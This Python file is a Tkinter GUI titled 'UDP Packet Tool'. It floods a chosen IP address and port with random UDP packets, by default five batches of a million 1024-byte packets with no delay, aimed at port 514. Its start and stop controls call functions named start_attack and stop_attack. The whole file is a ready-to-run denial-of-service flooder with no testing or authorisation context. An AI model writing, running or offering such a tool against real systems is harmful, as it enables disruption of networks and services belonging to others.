import tkinter as tk
from tkinter import ttk, messagebox
import socket
import random
import threading
import time

running = False

def send_packets(ip, port, batches, per_batch, size, delay, log_func):
    global running
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(size)

    try:
        for batch in range(1, batches + 1):
            if not running:
                break
            msg = f"Starting batch {batch} of {batches}"
            print(msg)
            log_func(msg)
            for sent in range(1, per_batch + 1):
                if not running:
                    break
                sock.sendto(data, (ip, port))
                if sent % 100000 == 0 or sent == per_batch:
                    msg = f"Sent {sent} packets so far in this batch..."
                    print(msg)
                    log_func(msg)
                if delay > 0:
                    time.sleep(delay)
            log_func(f"Batch {batch} complete.")
            print(f"Batch {batch} complete.")
    except Exception as e:
        msg = f"[ERROR] {e}"
        print(msg)
        log_func(msg)
    finally:
        sock.close()
        running = False
        log_func("Transmission ended.")
        print("Transmission ended.")

def start_attack():
    global running
    if running:
        return

    try:
        ip = ip_entry.get()
        port = int(port_entry.get())
        batches = int(batch_entry.get())
        per_batch = int(packet_entry.get())
        size = int(size_entry.get())
        delay = float(delay_entry.get())
    except ValueError:
        messagebox.showerror("Invalid Input", "Enter valid numbers.")
        return

    running = True
    thread = threading.Thread(
        target=send_packets,
        args=(ip, port, batches, per_batch, size, delay, log_message),
        daemon=True
    )
    thread.start()
    log_message("Started packet transmission...")

def stop_attack():
    global running
    running = False
    log_message("Stop signal issued.")

def log_message(msg):
    log_box.insert(tk.END, msg + "\n")
    log_box.see(tk.END)

# GUI Setup
root = tk.Tk()
root.title("UDP Packet Tool")

frame = ttk.Frame(root, padding=10)
frame.grid()

style_labels = [
    ("Target IP:", "0.0.0.0"),
    ("Target Port:", "514"),
    ("Batches:", "5"),
    ("Packets per Batch:", "1000000"),
    ("Packet Size (bytes):", "1024"),
    ("Delay (sec):", "0")
]

entries = []

for i, (label, default) in enumerate(style_labels):
    ttk.Label(frame, text=label).grid(column=0, row=i, sticky=tk.W)
    entry = ttk.Entry(frame)
    entry.insert(0, default)
    entry.grid(column=1, row=i)
    entries.append(entry)

ip_entry, port_entry, batch_entry, packet_entry, size_entry, delay_entry = entries

ttk.Button(frame, text="Start", command=start_attack).grid(column=0, row=len(entries), pady=10)
ttk.Button(frame, text="Stop", command=stop_attack).grid(column=1, row=len(entries))

log_box = tk.Text(root, height=15, width=60, bg="black", fg="lime", insertbackground="lime")
log_box.grid(padx=10, pady=10)

root.mainloop()
